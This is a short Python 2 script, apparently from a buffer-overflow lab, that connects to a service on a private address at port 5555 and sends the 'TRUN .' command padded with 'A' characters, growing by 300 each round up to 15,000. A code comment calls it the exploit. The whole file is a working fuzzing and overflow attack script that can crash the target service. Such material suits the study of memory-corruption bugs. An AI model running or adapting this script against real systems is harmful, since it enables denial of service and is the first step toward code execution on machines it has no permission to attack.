#!/usr/bin/python2
import time, struct, sys
import socket as so

server = '172.16.52.128'
port = 5555

auth = b'TRUN .'

for i in range(50):
  s = so.socket(so.AF_INET, so.SOCK_STREAM)

  a_len = 300 * (i + 1)
  print "Attempting this many A's: ", a_len

  the_req = auth + b'A' * a_len

  # Execute the exploit
  s.connect((server, port))
  print repr(s.recv(1024))
  s.send(the_req)
  print repr(s.recv(1024))
  s.close()

